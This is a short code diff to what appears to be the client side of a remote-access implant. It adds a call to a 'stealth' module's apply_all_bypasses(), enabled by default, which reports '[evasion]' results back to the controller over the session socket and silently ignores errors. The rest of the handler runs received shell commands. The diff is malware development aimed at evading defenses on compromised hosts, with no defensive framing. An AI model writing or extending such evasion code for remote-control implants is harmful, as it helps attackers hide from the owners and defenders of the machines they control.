@@ -1,12 +1,20 @@
 from client.core.session_context import SessionContext
 from client.commands import build_client_registry
 from client.modules.shell import run_command
+from client.modules.stealth import apply_all_bypasses
 
 
-def handle_session(sock, platform, encryption=False):
+def handle_session(sock, platform, encryption=False, tls=False, auto_bypass=True):
     protocol = _build_protocol(sock, encryption)
     ctx = SessionContext(sock=sock, protocol=protocol, platform=platform)
     registry = build_client_registry()
+
+    if auto_bypass:
+        try:
+            evasion_info = apply_all_bypasses()
+            protocol.send(f'[evasion]\n{evasion_info}')
+        except Exception:
+            pass
 
     try:
         while True:
